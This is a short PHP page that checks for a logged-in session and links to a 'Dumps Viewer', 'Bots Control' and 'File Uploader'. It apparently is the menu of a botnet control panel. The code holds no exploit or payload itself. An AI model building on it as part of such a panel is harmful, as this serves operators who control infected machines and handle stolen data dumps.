

<?php
session_start();
if(!isset($_SESSION['loggedin']))
{
die();
}
?>

<html>

<a href="viewer.php" target="_blank">Dumps Viewer</a>
<a href="master.php" target="_blank">Bots Control</a>
<a href="upload.php" target="_blank">File Uploader</a>
</html>

